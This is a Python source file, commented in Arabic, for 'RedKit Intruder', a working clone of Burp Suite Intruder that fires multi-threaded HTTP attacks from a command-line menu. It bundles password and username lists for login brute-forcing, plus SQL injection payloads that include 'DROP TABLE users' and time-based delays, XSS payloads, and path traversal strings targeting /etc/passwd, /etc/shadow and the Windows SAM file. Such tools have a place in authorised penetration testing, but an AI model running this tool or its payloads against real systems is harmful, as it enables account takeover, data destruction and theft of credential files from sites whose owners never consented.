"""
Intruder Module - مثل Burp Suite Intruder
يسمح بعمل هجمات آلية على الـ requests باستخدام payloads مختلفة
"""

import requests
import json
import urllib3
import threading
import queue
import time
import re
from typing import List, Dict, Any, Optional, Callable
from dataclasses import dataclass, asdict
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class AttackType(Enum):
    """أنواع الهجمات المتاحة"""
    SNIPER = "sniper"           # payload واحد في position واحد كل مرة
    BATTERING_RAM = "battering_ram"  # نفس الـ payload في كل الـ positions
    PITCHFORK = "pitchfork"     # payloads متوازية (أول payload مع أول position، إلخ)
    CLUSTER_BOMB = "cluster_bomb"  # كل التركيبات الممكنة


@dataclass
class IntruderRequest:
    """كلاس لتمثيل الـ Request Template"""
    method: str
    url: str
    headers: Dict[str, str]
    body: str = ""
    timeout: int = 30
    verify_ssl: bool = False


@dataclass
class IntruderResult:
    """كلاس لتمثيل نتيجة كل request"""
    payload: str
    payload_position: int
    status_code: int
    response_length: int
    elapsed_time: float
    error: Optional[str] = None
    response_body: str = ""
    response_headers: Dict[str, str] = None
    
    def __post_init__(self):
        if self.response_headers is None:
            self.response_headers = {}


class PayloadGenerator:
    """
    مولد الـ Payloads
    يدعم أنواع مختلفة من الـ payloads
    """
    
    @staticmethod
    def from_list(payloads: List[str]) -> List[str]:
        """payloads من قائمة"""
        return payloads
    
    @staticmethod
    def from_file(filepath: str) -> List[str]:
        """payloads من ملف (سطر = payload)"""
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    
    @staticmethod
    def numbers(start: int, end: int, step: int = 1) -> List[str]:
        """توليد أرقام"""
        return [str(i) for i in range(start, end + 1, step)]
    
    @staticmethod
    def bruteforce(charset: str, min_len: int, max_len: int) -> List[str]:
        """توليد كل التركيبات الممكنة من حروف معينة"""
        from itertools import product
        results = []
        for length in range(min_len, max_len + 1):
            for combo in product(charset, repeat=length):
                results.append(''.join(combo))
        return results
    
    @staticmethod
    def common_passwords() -> List[str]:
        """قائمة كلمات سر شائعة"""
        return [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "696969", "shadow", "master", "666666",
            "qwertyuiop", "123321", "mustang", "1234567890", "michael",
            "654321", "pussy", "superman", "1qaz2wsx", "7777777",
            "fuckyou", "121212", "000000", "qazwsx", "123qwe",
            "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
            "asdfgh", "hunter", "buster", "soccer", "harley",
            "batman", "andrew", "tigger", "sunshine", "iloveyou",
            "fuckme", "2000", "charlie", "robert", "thomas",
            "hockey", "ranger", "daniel", "starwars", "klaster",
            "112233", "george", "asshole", "computer", "michelle",
            "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom", "777777", "pass",
            "fuck", "maggie", "159753", "aaaaaa", "ginger",
            "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "6969", "nicole", "chelsea",
            "biteme", "matthew", "access", "yankees", "987654321",
            "dallas", "austin", "thunder", "taylor", "matrix",
            "admin", "root", "toor", "test", "guest"
        ]
    
    @staticmethod
    def common_usernames() -> List[str]:
        """قائمة أسماء مستخدمين شائعة"""
        return [
            "admin", "administrator", "root", "user", "test",
            "guest", "info", "adm", "mysql", "oracle",
            "ftp", "pi", "puppet", "ansible", "ec2-user",
            "vagrant", "azureuser", "demo", "ubuntu", "centos",
            "support", "manager", "operator", "backup", "web",
            "www", "www-data", "apache", "nginx", "tomcat"
        ]
    
    @staticmethod
    def sqli_payloads() -> List[str]:
        """SQL Injection payloads"""
        return [
            "'", "''", "\"", "\"\"",
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "admin'--", "admin'#", "admin'/*",
            "') OR ('1'='1", "') OR ('1'='1'--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "1; DROP TABLE users--", "1'; DROP TABLE users--",
            "' AND '1'='1", "' AND '1'='2",
            "1 AND 1=1", "1 AND 1=2",
            "' WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--", "' OR SLEEP(5)--"
        ]
    
    @staticmethod
    def xss_payloads() -> List[str]:
        """XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "'\"><script>alert('XSS')</script>",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>alert('XSS');//<</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<video><source onerror=\"alert('XSS')\">"
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[str]:
        """Path Traversal payloads"""
        return [
            "../", "..\\", "....//", "....\\\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f", "%2e%2e/", "..%2f",
            "%2e%2e%5c", "%2e%2e\\", "..%5c",
            "..%252f", "..%255c",
            "/etc/passwd", "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "....//....//....//....//etc/passwd"
        ]


class Intruder:
    """
    Intruder Class
    يسمح بعمل هجمات آلية على HTTP requests
    """
    
    # Marker للـ positions (مثل Burp)
    POSITION_MARKER = "§"
    
    def __init__(self, threads: int = 10):
        self.threads = threads
        self.results: List[IntruderResult] = []
        self.session = requests.Session()
        self.stop_flag = False
        self.progress_callback: Optional[Callable] = None
        
    def set_progress_callback(self, callback: Callable):
        """تعيين callback للـ progress updates"""
        self.progress_callback = callback
    
    def find_positions(self, template: str) -> List[tuple]:
        """
        إيجاد الـ positions في الـ template
        الـ positions محددة بـ § مثل Burp
        مثال: "username=§admin§&password=§pass§"
        """
        positions = []
        pattern = re.compile(f'{self.POSITION_MARKER}(.*?){self.POSITION_MARKER}')
        for match in pattern.finditer(template):
            positions.append((match.start(), match.end(), match.group(1)))
        return positions
    
    def replace_position(self, template: str, position_index: int, payload: str) -> str:
        """استبدال position معين بـ payload"""
        positions = self.find_positions(template)
        if position_index >= len(positions):
            return template
        
        result = template
        # نبدأ من الآخر عشان الـ indices متتغيرش
        for i, (start, end, _) in enumerate(reversed(positions)):
            actual_index = len(positions) - 1 - i
            if actual_index == position_index:
                result = result[:start] + payload + result[end:]
            else:
                # نشيل الـ markers بس
                result = result[:start] + positions[actual_index][2] + result[end:]
        return result
    
    def replace_all_positions(self, template: str, payload: str) -> str:
        """استبدال كل الـ positions بنفس الـ payload"""
        pattern = re.compile(f'{self.POSITION_MARKER}(.*?){self.POSITION_MARKER}')
        return pattern.sub(payload, template)
    
    def _send_request(self, req: IntruderRequest, payload: str, position: int) -> IntruderResult:
        """إرسال request واحد"""
        start_time = time.time()
        
        try:
            response = self.session.request(
                method=req.method.upper(),
                url=req.url,
                headers=req.headers,
                data=req.body if req.body else None,
                timeout=req.timeout,
                verify=req.verify_ssl
            )
            
            elapsed = time.time() - start_time
            
            return IntruderResult(
                payload=payload,
                payload_position=position,
                status_code=response.status_code,
                response_length=len(response.content),
                elapsed_time=round(elapsed, 3),
                response_body=response.text,
                response_headers=dict(response.headers)
            )
            
        except Exception as e:
            return IntruderResult(
                payload=payload,
                payload_position=position,
                status_code=0,
                response_length=0,
                elapsed_time=time.time() - start_time,
                error=str(e)
            )
    
    def attack_sniper(self, template: IntruderRequest, payloads: List[str]) -> List[IntruderResult]:
        """
        Sniper Attack
        كل payload يتحط في position واحد في كل مرة
        """
        self.results = []
        self.stop_flag = False
        
        # إيجاد عدد الـ positions
        all_text = f"{template.url}\n{json.dumps(template.headers)}\n{template.body}"
        positions = self.find_positions(all_text)
        
        total = len(payloads) * len(positions)
        current = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for pos_index in range(len(positions)):
                for payload in payloads:
                    if self.stop_flag:
                        break
                    
                    # استبدال الـ position المحدد
                    new_url = self.replace_position(template.url, pos_index, payload)
                    new_headers = {k: self.replace_position(v, pos_index, payload) 
                                   for k, v in template.headers.items()}
                    new_body = self.replace_position(template.body, pos_index, payload)
                    
                    req = IntruderRequest(
                        method=template.method,
                        url=new_url,
                        headers=new_headers,
                        body=new_body,
                        timeout=template.timeout,
                        verify_ssl=template.verify_ssl
                    )
                    
                    futures.append(executor.submit(self._send_request, req, payload, pos_index))
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                result = future.result()
                self.results.append(result)
                current += 1
                if self.progress_callback:
                    self.progress_callback(current, total, result)
        
        return self.results
    
    def attack_battering_ram(self, template: IntruderRequest, payloads: List[str]) -> List[IntruderResult]:
        """
        Battering Ram Attack
        نفس الـ payload في كل الـ positions
        """
        self.results = []
        self.stop_flag = False
        
        total = len(payloads)
        current = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for payload in payloads:
                if self.stop_flag:
                    break
                
                new_url = self.replace_all_positions(template.url, payload)
                new_headers = {k: self.replace_all_positions(v, payload) 
                               for k, v in template.headers.items()}
                new_body = self.replace_all_positions(template.body, payload)
                
                req = IntruderRequest(
                    method=template.method,
                    url=new_url,
                    headers=new_headers,
                    body=new_body,
                    timeout=template.timeout,
                    verify_ssl=template.verify_ssl
                )
                
                futures.append(executor.submit(self._send_request, req, payload, -1))
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                result = future.result()
                self.results.append(result)
                current += 1
                if self.progress_callback:
                    self.progress_callback(current, total, result)
        
        return self.results
    
    def attack_pitchfork(self, template: IntruderRequest, payload_sets: List[List[str]]) -> List[IntruderResult]:
        """
        Pitchfork Attack
        payloads متوازية - أول payload من كل set مع بعض، ثم التاني، إلخ
        """
        self.results = []
        self.stop_flag = False
        
        # أقل عدد من الـ payloads
        min_len = min(len(ps) for ps in payload_sets)
        total = min_len
        current = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for i in range(min_len):
                if self.stop_flag:
                    break
                
                # استبدال كل position بالـ payload المقابل
                new_url = template.url
                new_body = template.body
                new_headers = dict(template.headers)
                
                for pos_index, payload_set in enumerate(payload_sets):
                    payload = payload_set[i]
                    new_url = self.replace_position(new_url, pos_index, payload)
                    new_body = self.replace_position(new_body, pos_index, payload)
                    new_headers = {k: self.replace_position(v, pos_index, payload) 
                                   for k, v in new_headers.items()}
                
                combined_payload = " | ".join(ps[i] for ps in payload_sets)
                
                req = IntruderRequest(
                    method=template.method,
                    url=new_url,
                    headers=new_headers,
                    body=new_body,
                    timeout=template.timeout,
                    verify_ssl=template.verify_ssl
                )
                
                futures.append(executor.submit(self._send_request, req, combined_payload, -1))
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                result = future.result()
                self.results.append(result)
                current += 1
                if self.progress_callback:
                    self.progress_callback(current, total, result)
        
        return self.results
    
    def attack_cluster_bomb(self, template: IntruderRequest, payload_sets: List[List[str]]) -> List[IntruderResult]:
        """
        Cluster Bomb Attack
        كل التركيبات الممكنة من الـ payloads
        """
        from itertools import product
        
        self.results = []
        self.stop_flag = False
        
        # كل التركيبات
        combinations = list(product(*payload_sets))
        total = len(combinations)
        current = 0
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for combo in combinations:
                if self.stop_flag:
                    break
                
                new_url = template.url
                new_body = template.body
                new_headers = dict(template.headers)
                
                for pos_index, payload in enumerate(combo):
                    new_url = self.replace_position(new_url, pos_index, payload)
                    new_body = self.replace_position(new_body, pos_index, payload)
                    new_headers = {k: self.replace_position(v, pos_index, payload) 
                                   for k, v in new_headers.items()}
                
                combined_payload = " | ".join(combo)
                
                req = IntruderRequest(
                    method=template.method,
                    url=new_url,
                    headers=new_headers,
                    body=new_body,
                    timeout=template.timeout,
                    verify_ssl=template.verify_ssl
                )
                
                futures.append(executor.submit(self._send_request, req, combined_payload, -1))
            
            for future in as_completed(futures):
                if self.stop_flag:
                    break
                result = future.result()
                self.results.append(result)
                current += 1
                if self.progress_callback:
                    self.progress_callback(current, total, result)
        
        return self.results
    
    def stop(self):
        """إيقاف الهجوم"""
        self.stop_flag = True
    
    def get_results(self) -> List[IntruderResult]:
        """إرجاع النتائج"""
        return self.results
    
    def get_results_summary(self) -> Dict[str, Any]:
        """ملخص النتائج"""
        if not self.results:
            return {}
        
        status_codes = {}
        lengths = []
        times = []
        errors = 0
        
        for r in self.results:
            if r.error:
                errors += 1
            else:
                status_codes[r.status_code] = status_codes.get(r.status_code, 0) + 1
                lengths.append(r.response_length)
                times.append(r.elapsed_time)
        
        return {
            "total_requests": len(self.results),
            "errors": errors,
            "status_codes": status_codes,
            "avg_length": sum(lengths) / len(lengths) if lengths else 0,
            "avg_time": sum(times) / len(times) if times else 0,
            "min_length": min(lengths) if lengths else 0,
            "max_length": max(lengths) if lengths else 0
        }
    
    def filter_results(self, 
                       status_code: int = None, 
                       min_length: int = None, 
                       max_length: int = None,
                       contains: str = None) -> List[IntruderResult]:
        """فلترة النتائج"""
        filtered = self.results
        
        if status_code:
            filtered = [r for r in filtered if r.status_code == status_code]
        if min_length:
            filtered = [r for r in filtered if r.response_length >= min_length]
        if max_length:
            filtered = [r for r in filtered if r.response_length <= max_length]
        if contains:
            filtered = [r for r in filtered if contains in r.response_body]
        
        return filtered
    
    def export_results(self, filename: str, format: str = "json"):
        """تصدير النتائج"""
        if format == "json":
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump([asdict(r) for r in self.results], f, ensure_ascii=False, indent=2)
        elif format == "csv":
            import csv
            with open(filename, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['Payload', 'Position', 'Status', 'Length', 'Time', 'Error'])
                for r in self.results:
                    writer.writerow([r.payload, r.payload_position, r.status_code, 
                                     r.response_length, r.elapsed_time, r.error or ''])


# ============ CLI Interface ============

if __name__ == "__main__":
    print("=" * 60)
    print("  RedKit Intruder - Automated Attack Tool")
    print("=" * 60)
    
    intruder = Intruder(threads=10)
    
    def progress(current, total, result):
        print(f"  [{current}/{total}] {result.payload[:30]} → {result.status_code} ({result.response_length} bytes)")
    
    intruder.set_progress_callback(progress)
    
    while True:
        print("\n[1] Quick Sniper Attack")
        print("[2] Quick Battering Ram Attack")
        print("[3] Cluster Bomb Attack")
        print("[4] Load payloads from file")
        print("[5] Use built-in payloads")
        print("[6] View last results")
        print("[7] Export results")
        print("[8] Exit")
        
        choice = input("\nChoice: ").strip()
        
        if choice == "1":
            url = input("URL (use § for positions, e.g., http://site.com/user/§1§): ").strip()
            method = input("Method (GET/POST): ").strip().upper()
            body = ""
            if method == "POST":
                body = input("Body (use § for positions): ").strip()
            
            print("\nPayload source:")
            print("  [1] Enter manually")
            print("  [2] Numbers range")
            print("  [3] Common passwords")
            print("  [4] SQLi payloads")
            print("  [5] XSS payloads")
            ps = input("Choice: ").strip()
            
            if ps == "1":
                payloads = input("Payloads (comma separated): ").strip().split(',')
            elif ps == "2":
                start = int(input("Start: "))
                end = int(input("End: "))
                payloads = PayloadGenerator.numbers(start, end)
            elif ps == "3":
                payloads = PayloadGenerator.common_passwords()
            elif ps == "4":
                payloads = PayloadGenerator.sqli_payloads()
            elif ps == "5":
                payloads = PayloadGenerator.xss_payloads()
            else:
                payloads = ["test"]
            
            template = IntruderRequest(method=method, url=url, headers={}, body=body)
            
            print(f"\n🚀 Starting Sniper attack with {len(payloads)} payloads...")
            results = intruder.attack_sniper(template, payloads)
            
            print(f"\n✅ Attack complete! {len(results)} requests sent.")
            summary = intruder.get_results_summary()
            print(f"   Status codes: {summary.get('status_codes', {})}")
            print(f"   Avg response length: {summary.get('avg_length', 0):.0f} bytes")
        
        elif choice == "2":
            url = input("URL (use § for positions): ").strip()
            method = input("Method (GET/POST): ").strip().upper()
            body = ""
            if method == "POST":
                body = input("Body (use § for positions): ").strip()
            
            payloads = input("Payloads (comma separated): ").strip().split(',')
            
            template = IntruderRequest(method=method, url=url, headers={}, body=body)
            
            print(f"\n🚀 Starting Battering Ram attack...")
            results = intruder.attack_battering_ram(template, payloads)
            print(f"\n✅ Attack complete!")
        
        elif choice == "5":
            print("\nBuilt-in payload lists:")
            print("  [1] Common passwords")
            print("  [2] Common usernames")
            print("  [3] SQLi payloads")
            print("  [4] XSS payloads")
            print("  [5] Path traversal payloads")
            
            ps = input("Choice: ").strip()
            
            if ps == "1":
                payloads = PayloadGenerator.common_passwords()
            elif ps == "2":
                payloads = PayloadGenerator.common_usernames()
            elif ps == "3":
                payloads = PayloadGenerator.sqli_payloads()
            elif ps == "4":
                payloads = PayloadGenerator.xss_payloads()
            elif ps == "5":
                payloads = PayloadGenerator.path_traversal_payloads()
            else:
                payloads = []
            
            print(f"\n📋 {len(payloads)} payloads loaded:")
            for p in payloads[:10]:
                print(f"   - {p}")
            if len(payloads) > 10:
                print(f"   ... and {len(payloads) - 10} more")
        
        elif choice == "6":
            results = intruder.get_results()
            print(f"\n📊 {len(results)} results:")
            for r in results[:20]:
                status = f"✅ {r.status_code}" if r.status_code else f"❌ {r.error}"
                print(f"   {r.payload[:40]} → {status} ({r.response_length} bytes)")
        
        elif choice == "7":
            filename = input("Filename (e.g., results.json): ").strip()
            fmt = "csv" if filename.endswith('.csv') else "json"
            intruder.export_results(filename, fmt)
            print(f"✅ Results exported to {filename}")
        
        elif choice == "8":
            print("👋 Bye!")
            break
